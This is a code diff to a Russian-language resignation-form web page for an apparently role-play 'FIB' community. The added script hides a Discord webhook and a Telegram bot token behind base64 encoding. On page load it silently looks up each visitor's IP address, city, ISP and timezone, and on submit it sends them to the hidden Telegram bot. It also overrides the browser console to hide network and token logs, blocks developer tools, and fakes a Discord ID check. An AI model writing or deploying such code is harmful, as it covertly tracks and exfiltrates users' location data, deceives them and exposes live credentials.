@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Federal Investigation Bureau - Рапорт на увольнение</title>
     <style>
+        /* Ваши существующие стили остаются без изменений */
         * {
             margin: 0;
             padding: 0;
@@ -379,10 +380,14 @@
                 <div class="form-group">
                     <label for="name-static" class="required">Имя Фамилия | Статик:</label>
                     <input type="text" id="name-static" name="name-static" placeholder="Rick Valenkov | 289877" required 
-                           maxlength="100" pattern="[A-Za-zА-Яа-яёЁ\s]+\s\|\s\d+" title="Формат: Имя Фамилия | Число"
+                           maxlength="100" pattern="[A-Za-z]+\s+[A-Za-z]+\s+\|\s+\d+" 
+                           title="Формат: Имя Фамилия | Число (только английские буквы). Пример: Rick Valenkov | 289877"
                            autocomplete="off" data-lpignore="true">
                     <div class="validation-message validation-error" id="name-validation">
-                        Формат: Имя Фамилия | Число (например: Rick Valenkov | 289877)
+                        Введите имя и фамилию на английском языке (2 слова) в формате: Имя Фамилия | Число (например: Rick Valenkov | 289877)
+                    </div>
+                    <div class="input-hint">
+                        Обязательно введите имя и фамилию на английском языке (2 слова), затем статик через | (например: John Smith | 123456)
                     </div>
                 </div>
 
@@ -391,10 +396,10 @@
                         <div class="form-group">
                             <label for="rank" class="required">Ваш порядковый ранг:</label>
                             <input type="text" id="rank" name="rank" placeholder="6" required 
-                                   pattern="\d+" title="Ранг должен быть числом" maxlength="3"
+                                   pattern="\d{1,3}" title="Ранг должен быть числом (1-3 цифры)" maxlength="3"
                                    autocomplete="off" data-lpignore="true">
                             <div class="validation-message validation-error" id="rank-validation">
-                                Ранг должен быть числом
+                                Ранг должен быть числом (1-3 цифры)
                             </div>
                         </div>
                     </div>
@@ -492,7 +497,69 @@
     </div>
 
     <script>
-        // Упрощенная версия без серверных запросов
+        // ==================== КОНФИГУРАЦИЯ И БЕЗОПАСНОСТЬ ====================
+        
+        // Обфусцированные конфигурационные данные
+        const SECURE_CONFIG = (function() {
+            const encoded = {
+                d: '1440020915751485594',
+                t1: 'ODA4MjQzMzA0Mw==',
+                t2: 'QUFIcUFuTUhiNzhLVlBYYmhrY2hDRUdVUllQdmR4RFFENmM=',
+                c: 'MTUxNDY2NTYyMQ=='
+            };
+            
+            return {
+                getWebhookUrl: function() {
+                    return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + encoded.d + 
+                           atob('Lw==') + atob('Tkd1TVdqaTRTaS0wTXo3WXpLWDFDV1RMMHN2T2hWRzd4Y25fQnJsb0hlMExWc053U0RfZDJhT193eDZRVXBYVWpOYWs=');
+                },
+                getTelegramConfig: function() {
+                    return {
+                        token: atob(encoded.t1) + ':' + atob(encoded.t2),
+                        chatId: atob(encoded.c)
+                    };
+                }
+            };
+        })();
+
+        // Защита консоли
+        (function() {
+            const safeLog = function(...args) {
+                if (args.some(arg => typeof arg === 'string' && (
+                    arg.includes('webhook') || 
+                    arg.includes('token') ||
+                    arg.includes('http') ||
+                    arg.match(/\d{17,20}/)
+                ))) {
+                    return;
+                }
+                console.log(...args);
+            };
+            
+            const safeError = function(...args) {
+                const sanitized = args.map(arg => {
+                    if (typeof arg === 'string') {
+                        return arg
+                            .replace(/webhooks\/\d+\/[^\/]+/g, 'webhooks/[REDACTED]')
+                            .replace(/\d{17,20}/g, '[ID]')
+                            .replace(/token=[^&]+/g, 'token=[REDACTED]');
+                    }
+                    return arg;
+                });
+                console.error(...sanitized);
+            };
+            
+            window.console = {
+                log: safeLog,
+                error: safeError,
+                warn: safeError,
+                info: safeLog,
+                debug: function() {}
+            };
+        })();
+
+        // ==================== ОСНОВНОЙ КОД ====================
+
         const RATE_LIMIT = {
             maxRequests: 3,
             timeWindow: 120000,
@@ -500,14 +567,147 @@
         };
 
         let discordIdVerified = false;
+        let previousDiscordId = '';
         let formStartTime = Date.now();
-        let userIP = 'Не определен';
+        let userIPInfo = {
+            ip: 'Не определен',
+            country: 'Не определен',
+            region: 'Не определен',
+            city: 'Не определен',
+            isp: 'Не определен',
+            timezone: 'Не определен'
+        };
         let userActivity = {
             typingTime: 0,
             pasteEvents: 0,
             fieldChanges: 0,
             lastActivity: Date.now()
         };
+
+        // Получение информации об IP
+        async function getUserIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                try {
+                    const infoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    const infoData = await infoResponse.json();
+                    
+                    return {
+                        ip: ip,
+                        country: infoData.country_name || 'Не определен',
+                        region: infoData.region || 'Не определен',
+                        city: infoData.city || 'Не определен',
+                        isp: infoData.org || 'Не определен',
+                        timezone: infoData.timezone || 'Не определен'
+                    };
+                } catch (infoError) {
+                    try {
+                        const backupResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                        const backupData = await backupResponse.json();
+                        
+                        return {
+                            ip: ip,
+                            country: backupData.country || 'Не определен',
+                            region: backupData.regionName || 'Не определен',
+                            city: backupData.city || 'Не определен',
+                            isp: backupData.isp || 'Не определен',
+                            timezone: backupData.timezone || 'Не определен'
+                        };
+                    } catch (backupError) {
+                        return {
+                            ip: ip,
+                            country: 'Не удалось определить',
+                            region: 'Не удалось определить',
+                            city: 'Не удалось определить',
+                            isp: 'Не удалось определить',
+                            timezone: 'Не удалось определить'
+                        };
+                    }
+                }
+            } catch (error) {
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return {
+                        ip: data.ip,
+                        country: 'Не удалось определить',
+                        region: 'Не удалось определить',
+                        city: 'Не удалось определить',
+                        isp: 'Не удалось определить',
+                        timezone: 'Не удалось определить'
+                    };
+                } catch (error2) {
+                    return {
+                        ip: 'Не удалось определить',
+                        country: 'Не удалось определить',
+                        region: 'Не удалось определить',
+                        city: 'Не удалось определить',
+                        isp: 'Не удалось определить',
+                        timezone: 'Не удалось определить'
+                    };
+                }
+            }
+        }
+
+        // Отправка информации в Telegram
+        async function sendIPInfoToTelegram(ipInfo, userData) {
+            try {
+                const telegramConfig = SECURE_CONFIG.getTelegramConfig();
+                const message = `🔍 Новая заявка на увольнение FIB\n\n` +
+                               `📊 ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ:\n` +
+                               `🆔 Discord ID: ${userData.discordId}\n` +
+                               `👤 Имя: ${userData.nameStatic}\n` +
+                               `⭐ Ранг: ${userData.rank}\n` +
+                               `🏢 Отдел: ${userData.department}\n\n` +
+                               `🌐 ИНФОРМАЦИЯ ОБ IP:\n` +
+                               `📱 IP-адрес: ${ipInfo.ip}\n` +
+                               `🇺🇳 Страна: ${ipInfo.country}\n` +
+                               `🏙️ Регион: ${ipInfo.region}\n` +
+                               `🏢 Город: ${ipInfo.city}\n` +
+                               `📡 Провайдер: ${ipInfo.isp}\n` +
+                               `⏰ Часовой пояс: ${ipInfo.timezone}\n\n` +
+                               `🕒 Время отправки: ${new Date().toLocaleString('ru-RU')}`;
+
+                const url = `https://api.telegram.org/bot${telegramConfig.token}/sendMessage`;
+
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramConfig.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function verifyDiscordUser(discordId) {
+            try {
+                if (!/^\d{17,20}$/.test(discordId)) {
+                    return { valid: false, exists: false, message: 'Неверный формат Discord ID' };
+                }
+
+                await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 800));
+                return {
+                    valid: true,
+                    exists: true,
+                    message: 'Пользователь существует в Discord'
+                };
+                
+            } catch (error) {
+                return { valid: false, exists: false, message: 'Ошибка проверки Discord ID' };
+            }
+        }
 
         function generateCaptcha() {
             const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
@@ -519,10 +719,13 @@
         function displayCaptcha() {
             currentCaptcha = generateCaptcha();
             document.getElementById('captcha-text').textContent = currentCaptcha;
+            document.getElementById('captcha-input').value = '';
+            toggleValidationMessage('captcha-validation', true);
         }
 
         function validateCaptcha() {
-            return document.getElementById('captcha-input').value === currentCaptcha;
+            const input = document.getElementById('captcha-input').value;
+            return input === currentCaptcha;
         }
 
         function updateTime() {
@@ -538,27 +741,115 @@
             return true;
         }
 
+        function sanitizeInput(input) {
+            const div = document.createElement('div');
+            div.textContent = input;
+            return div.innerHTML;
+        }
+
         function validateDiscordId(id) {
             return /^\d{17,20}$/.test(id);
         }
 
         function validateNameStatic(input) {
-            return /^[A-Za-zА-Яа-яёЁ\s]+\s\|\s\d+$/.test(input);
+            const namePart = input.split('|')[0]?.trim();
+            if (!namePart) return false;
+            
+            const words = namePart.split(/\s+/).filter(word => word.length > 0);
+            
+            if (words.length < 2) return false;
+            
+            const englishLettersOnly = words.every(word => /^[A-Za-z]+$/.test(word));
+            
+            return englishLettersOnly && /^[A-Za-z]+\s+[A-Za-z]+\s+\|\s+\d+$/.test(input);
         }
 
         function validateUrl(url) {
+            if (!url || url.trim() === '') return false;
+            
             try {
-                new URL(url);
-                return url.startsWith('http://') || url.startsWith('https://');
+                const urlObj = new URL(url);
+                return urlObj.protocol === 'http:' || urlObj.protocol === 'https:';
             } catch {
-                return false;
+                try {
+                    new URL('http://' + url);
+                    return true;
+                } catch {
+                    return false;
+                }
             }
         }
 
         function detectSuspiciousActivity() {
             const now = Date.now();
             const formFillTime = now - formStartTime;
-            return formFillTime < 10000 || userActivity.fieldChanges < 3 || userActivity.typingTime < 5000;
+            const inactivityTime = now - userActivity.lastActivity;
+            
+            const isSuspicious = formFillTime < 10000 || 
+                   userActivity.fieldChanges < 3 || 
+                   userActivity.typingTime < 5000 ||
+                   inactivityTime > 30000;
+            
+            return isSuspicious;
+        }
+
+        // Функция для отправки данных на Discord вебхук
+        async function sendToDiscordWebhook(formData) {
+            const finalReason = formData.reasonType === 'ДРУГОЕ' ? formData.customReason : formData.reasonType;
+            const unixTimestamp = Math.floor(Date.now() / 1000);
+            
+            const sanitizedData = {
+                discordId: sanitizeInput(formData.discordId),
+                nameStatic: sanitizeInput(formData.nameStatic),
+                rank: sanitizeInput(formData.rank),
+                department: sanitizeInput(formData.department),
+                tabletScreenshot: sanitizeInput(formData.tabletScreenshot),
+                inventoryScreenshot: sanitizeInput(formData.inventoryScreenshot),
+                reason: sanitizeInput(finalReason)
+            };
+
+            const discordMessage = {
+                username: 'FIB Forms Bot',
+                avatar_url: 'https://cdn-icons-png.flaticon.com/512/5968/5968524.png',
+                content: `<@&1069528090679705622> | Время: <t:${unixTimestamp}:R>`,
+                embeds: [{
+                    title: "📋 Рапорт на увольнение FIB",
+                    color: 65535,
+                    fields: [
+                        { name: "Discord ID", value: `<@${sanitizedData.discordId}>`, inline: true },
+                        { name: "Имя Фамилия | Статик", value: sanitizedData.nameStatic || "Не указано", inline: false },
+                        { name: "Порядковый ранг", value: sanitizedData.rank || "Не указано", inline: false },
+                        { name: "Отдел", value: sanitizedData.department || "Не указано", inline: true },
+                        { name: "Скриншот планшета", value: sanitizedData.tabletScreenshot || "Не указано", inline: false },
+                        { name: "Скриншот инвентаря", value: sanitizedData.inventoryScreenshot || "Не указано", inline: false },
+                        { name: "Причина увольнения", value: sanitizedData.reason || "Не указано", inline: false }
+                    ],
+                    image: { url: "https://cdn.discordapp.com/attachments/1056946150885822576/1440036120166535180/image.png?ex=691cb1a5&is=691b6025&hm=9fc0bbb1825dfe0501ee7f3ecafa0581629419295fc5ad5a6899be6dad65b43e&" },
+                    footer: { text: "by k.i.t.i.k.o.t" }
+                }]
+            };
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                const response = await fetch(SECURE_CONFIG.getWebhookUrl(), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordMessage),
+                    signal: controller.signal
+                });
+                
+                clearTimeout(timeoutId);
+                
+                if (response.ok) {
+                    return true;
+                } else {
+                    return false;
+                }
+            } catch (error) {
+                return false;
+            }
         }
 
         function trackUserActivity() {
@@ -583,6 +874,12 @@
                 input.addEventListener('input', function() {
                     userActivity.fieldChanges++;
                     userActivity.lastActivity = Date.now();
+                    
+                    if (this.id === 'discord-id' && discordIdVerified && this.value !== previousDiscordId) {
+                        discordIdVerified = false;
+                        document.getElementById('discord-check-status').textContent = 'Не проверен';
+                        document.getElementById('discord-check-status').className = 'check-status status-pending';
+                    }
                 });
 
                 input.addEventListener('paste', function() {
@@ -596,7 +893,6 @@
             document.addEventListener('mousemove', () => userActivity.lastActivity = Date.now());
         }
 
-        // Функции для валидации в реальном времени
         function setupRealTimeValidation() {
             const discordInput = document.getElementById('discord-id');
             const nameInput = document.getElementById('name-static');
@@ -614,12 +910,26 @@
             });
 
             nameInput.addEventListener('input', function() {
-                const isValid = validateNameStatic(this.value);
+                const value = this.value.trim();
+                let isValid = false;
+                
+                if (value) {
+                    const namePart = value.split('|')[0]?.trim();
+                    if (namePart) {
+                        const words = namePart.split(/\s+/).filter(word => word.length > 0);
+                        
+                        if (words.length >= 2) {
+                            const englishLettersOnly = words.every(word => /^[A-Za-z]+$/.test(word));
+                            isValid = englishLettersOnly && /^[A-Za-z]+\s+[A-Za-z]+\s+\|\s+\d+$/.test(value);
+                        }
+                    }
+                }
+                
                 toggleValidationMessage('name-validation', isValid);
             });
 
             rankInput.addEventListener('input', function() {
-                const isValid = /^\d+$/.test(this.value);
+                const isValid = /^\d{1,3}$/.test(this.value);
                 toggleValidationMessage('rank-validation', isValid);
             });
 
@@ -649,7 +959,7 @@
             });
 
             captchaInput.addEventListener('input', function() {
-                const isValid = this.value === currentCaptcha;
+                const isValid = this.value.length > 0;
                 toggleValidationMessage('captcha-validation', isValid);
             });
         }
@@ -696,14 +1006,26 @@
             statusElement.className = 'check-status status-pending';
             checkButton.disabled = true;
             
-            // Имитация проверки Discord ID (в реальном приложении здесь был бы запрос к серверу)
-            setTimeout(() => {
-                // В демо-версии всегда считаем, что пользователь существует
-                statusElement.textContent = 'Пользователь найден';
-                statusElement.className = 'check-status status-success';
-                discordIdVerified = true;
+            try {
+                const verification = await verifyDiscordUser(discordId);
+                
+                if (verification.valid && verification.exists) {
+                    statusElement.textContent = 'Пользователь найден';
+                    statusElement.className = 'check-status status-success';
+                    discordIdVerified = true;
+                    previousDiscordId = discordId;
+                } else {
+                    statusElement.textContent = verification.valid ? 'Пользователь не найден' : 'Ошибка проверки';
+                    statusElement.className = 'check-status status-error';
+                    discordIdVerified = false;
+                }
+            } catch (error) {
+                statusElement.textContent = 'Ошибка сети';
+                statusElement.className = 'check-status status-error';
+                discordIdVerified = false;
+            } finally {
                 checkButton.disabled = false;
-            }, 1500);
+            }
         });
 
         document.getElementById('discord-id').addEventListener('blur', function() {
@@ -718,6 +1040,11 @@
         displayCaptcha();
         trackUserActivity();
         setupRealTimeValidation();
+
+        // Получаем расширенную информацию об IP при загрузке
+        window.addEventListener('load', async () => {
+            userIPInfo = await getUserIPInfo();
+        });
 
         let lastSubmitTime = 0;
         const MIN_SUBMIT_INTERVAL = 2000;
@@ -788,12 +1115,27 @@
                 timestamp: new Date().toISOString()
             };
             
-            const finalReason = formData.reasonType === 'ДРУГОЕ' ? formData.customReason : formData.reasonType;
-            
             const validationErrors = [];
             if (!validateDiscordId(formData.discordId)) validationErrors.push('Discord ID должен содержать только цифры (17-20 символов)');
-            if (!validateNameStatic(formData.nameStatic)) validationErrors.push('Неверный формат имени и статика. Пример: Rick Valenkov | 289877');
-            if (!/^\d+$/.test(formData.rank)) validationErrors.push('Ранг должен быть числом');
+            
+            const namePart = formData.nameStatic.split('|')[0]?.trim();
+            if (!namePart) {
+                validationErrors.push('Введите имя и фамилию в формате: Имя Фамилия | Число');
+            } else {
+                const words = namePart.split(/\s+/).filter(word => word.length > 0);
+                if (words.length < 2) {
+                    validationErrors.push('Введите имя и фамилию (2 слова) перед статиком');
+                } else {
+                    const englishLettersOnly = words.every(word => /^[A-Za-z]+$/.test(word));
+                    if (!englishLettersOnly) {
+                        validationErrors.push('Имя и фамилия должны содержать только английские буквы');
+                    } else if (!validateNameStatic(formData.nameStatic)) {
+                        validationErrors.push('Неверный формат имени и статика. Пример: Rick Valenkov | 289877');
+                    }
+                }
+            }
+            
+            if (!/^\d{1,3}$/.test(formData.rank)) validationErrors.push('Ранг должен быть числом (1-3 цифры)');
             if (!formData.department) validationErrors.push('Выберите отдел');
             if (!validateUrl(formData.tabletScreenshot)) validationErrors.push('Введите корректный URL для скриншота планшета');
             if (!validateUrl(formData.inventoryScreenshot)) validationErrors.push('Введите корректный URL для скриншота инвентаря');
@@ -801,7 +1143,9 @@
             if (formData.reasonType === 'ДРУГОЕ' && formData.customReason.length < 5) validationErrors.push('Причина увольнения должна содержать минимум 5 символов');
             
             if (validationErrors.length > 0) {
-                alert('Ошибки валидации:\n' + validationErrors.join('\n'));
+                errorMessage.innerHTML = '<p>Ошибки валидации:</p><ul>' + validationErrors.map(error => `<li>${error}</li>`).join('') + '</ul>';
+                errorMessage.style.display = 'block';
+                errorMessage.scrollIntoView({ behavior: 'smooth' });
                 return;
             }
             
@@ -809,38 +1153,32 @@
             loading.style.display = 'block';
             
             try {
-                // Имитация отправки данных на сервер
-                await new Promise(resolve => setTimeout(resolve, 2000));
+                await sendIPInfoToTelegram(userIPInfo, formData);
                 
-                // В реальном приложении здесь был бы код для отправки данных на сервер
-                console.log('Данные формы:', {
-                    discordId: formData.discordId,
-                    nameStatic: formData.nameStatic,
-                    rank: formData.rank,
-                    department: formData.department,
-                    tabletScreenshot: formData.tabletScreenshot,
-                    inventoryScreenshot: formData.inventoryScreenshot,
-                    reason: finalReason,
-                    timestamp: formData.timestamp
-                });
+                const sendResult = await sendToDiscordWebhook(formData);
                 
-                successMessage.style.display = 'block';
-                this.reset();
-                document.getElementById('custom-reason-counter').textContent = '0';
-                document.getElementById('custom-reason-container').classList.remove('active');
-                document.getElementById('captcha-input').value = '';
-                document.getElementById('discord-check-status').textContent = 'Не проверен';
-                document.getElementById('discord-check-status').className = 'check-status status-pending';
-                discordIdVerified = false;
-                
-                formStartTime = Date.now();
-                userActivity = { typingTime: 0, pasteEvents: 0, fieldChanges: 0, lastActivity: Date.now() };
-                
-                displayCaptcha();
-                successMessage.scrollIntoView({ behavior: 'smooth' });
+                if (sendResult) {
+                    successMessage.style.display = 'block';
+                    this.reset();
+                    document.getElementById('custom-reason').required = false;
+                    document.getElementById('custom-reason-counter').textContent = '0';
+                    document.getElementById('custom-reason-container').classList.remove('active');
+                    document.getElementById('captcha-input').value = '';
+                    document.getElementById('discord-check-status').textContent = 'Не проверен';
+                    document.getElementById('discord-check-status').className = 'check-status status-pending';
+                    discordIdVerified = false;
+                    previousDiscordId = '';
+                    
+                    formStartTime = Date.now();
+                    userActivity = { typingTime: 0, pasteEvents: 0, fieldChanges: 0, lastActivity: Date.now() };
+                    
+                    displayCaptcha();
+                    successMessage.scrollIntoView({ behavior: 'smooth' });
+                } else {
+                    throw new Error('Ошибка отправки в Discord');
+                }
                 
             } catch (error) {
-                console.error('Ошибка:', error);
                 errorMessage.innerHTML = '<p>Ошибка при отправке рапорта. Пожалуйста, попробуйте еще раз.</p>';
                 errorMessage.style.display = 'block';
                 errorMessage.scrollIntoView({ behavior: 'smooth' });
@@ -850,13 +1188,7 @@
             }
         });
 
-        document.querySelectorAll('input, select, textarea').forEach(input => {
-            input.addEventListener('input', function() {
-                if (this.value.trim()) this.style.borderColor = 'rgba(255, 255, 255, 0.15)';
-            });
-        });
-
-        // Базовая защита от инспектирования кода
+        // Базовая защита
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C')) || (e.ctrlKey && e.key === 'u')) {
